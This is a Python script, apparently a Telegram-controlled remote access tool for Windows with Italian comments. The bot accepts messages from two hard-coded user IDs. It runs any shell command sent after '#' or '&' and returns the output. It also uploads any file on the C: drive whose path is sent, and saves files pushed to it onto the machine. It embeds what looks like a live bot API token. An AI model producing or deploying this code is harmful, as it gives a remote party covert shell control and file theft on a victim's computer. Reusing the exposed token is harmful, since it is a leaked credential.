
import telepot
from telepot.loop import MessageLoop
import time,os,sys
from pprint import pprint







def Esegui(messaggio):
    pprint(messaggio)
    chatId=messaggio["chat"]["id"]
    
    if messaggio['from']['id'] == Id1 or messaggio['from']['id'] == Id2:
      
      
      
      
        if 'document' in messaggio.keys():
                  
            bot.download_file(messaggio['document']['file_id'],'Scaricati/' + str(messaggio['document']['file_name']))
            global lastFile
            lastFile = messaggio['document']['file_name']
            return
        
        
        if "text" in messaggio.keys():
          
          
          
            if messaggio['text'].startswith('ls'):   #Esegue comando specificato
                try:
                    outputHelp=os.listdir("")
                    for i in range(len(outputHelp)):
                        outputHelp[i]=outputHelp[i]+"\n"
                    output="".join(outputHelp)
                    bot.sendMessage(chatId,output)
                    return
                except Exception as e:
                    bot.sendMessage(chatId,'Errore: ' + str(e))
                    return
                  
            if messaggio["text"].startswith("#"):
                command=messaggio["text"].split("#")[1]
                try:
                    os.system(str(command)+"> output.txt")
                    outputFile=open("output.txt", "r")
                    output=outputFile.readlines()
                    outputFile.close()
                    output="".join(output)
                    if(len(output)==0):output="Eseguito"
                    bot.sendMessage(chatId,output)
                    os.system("del output.txt")
                    return 
                except Exception as e:
                    bot.sendMessage(chatId,'Errore: ' + str(e))
                    return
            if(messaggio["text"].startswith("C:/")):    #Manda il file contenuto nel path
                try:
                    bot.sendDocument(chatId,document=open(messaggio["text"]))
                    return
                except Exception as Err:
                    bot.sendMessage(chatId,"Errore: "+str(Err))
                    return
            if(messaggio["text"].startswith("&")):    #Esegue comando specificato senza output
                command=messaggio["text"].split("&")[1]
                try:
                    os.system("start /B "+str(command))
                    bot.sendMessage(chatId,"Eseguito")
                    return
                except Exception as Err:
                    bot.sendMessage(chatId,"Errore: "+str(Err))
                    return
    
    return








bot = telepot.Bot('1387322515:AAGFI7rVipjRm7KEi2n-Ay2i4e7_K6uN0n8')

global Id1
global Id2


Id1 = 243898019
Id2 = 514341799

try:
    bot.sendDocument(Id1,document=open("output.txt"))
    bot.sendDocument(Id2,document=open("output.txt"))
    os.system("rm output.txt")
except:
    pass


MessageLoop(bot, Esegui).run_as_thread()




while 1:
    time.sleep(3600)
    sys.exit()

